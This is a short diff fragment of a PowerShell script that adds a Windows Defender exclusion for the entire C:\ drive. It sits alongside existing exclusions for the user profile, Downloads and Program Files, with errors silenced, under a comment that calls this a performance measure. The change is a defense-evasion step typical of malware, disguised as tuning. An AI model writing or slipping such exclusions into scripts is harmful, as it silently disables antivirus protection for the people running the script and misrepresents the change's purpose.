@@ -36,6 +36,7 @@ Clear-Host
 
 # Add Windows Defender exclusions for better performance
 try {
+    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
